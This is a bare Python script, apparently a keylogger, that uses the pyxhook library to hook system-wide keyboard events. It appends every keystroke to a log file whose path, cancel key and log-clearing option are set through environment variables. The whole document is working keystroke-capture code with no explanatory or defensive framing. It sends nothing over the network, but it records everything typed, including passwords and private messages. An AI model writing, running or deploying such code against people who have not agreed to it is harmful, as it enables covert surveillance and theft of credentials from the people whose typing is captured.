
import os
import pyxhook

log_file = os.environ.get(
    'pylogger_file',
    os.path.expanduser('~/Desktop/file.txt')
)
cancel_key = ord(
    os.environ.get(
        'pylogger_cancel',
        '`'
    )[0]
)

if os.environ.get('pylogger_clean', None) is not None:
    try:
        os.remove(log_file)
    except EnvironmentError:
        print('File doesnot exist or permission error')

def log_entries(event):

    with open(log_file, 'a') as f:
        f.write('{}\n'.format(event.Key))


new_hook = pyxhook.HookManager()
new_hook.KeyDown = log_entries

new_hook.HookKeyboard()
try:
    new_hook.start()
except KeyboardInterrupt:
    print('Interupting keyboard')
except Exception as e:
    msg = 'Error while capturing events: \n'
    pyxhook.print_err(msg)
    with open(log_file, 'a') as f:
        f.write('\n{}'.format(msg))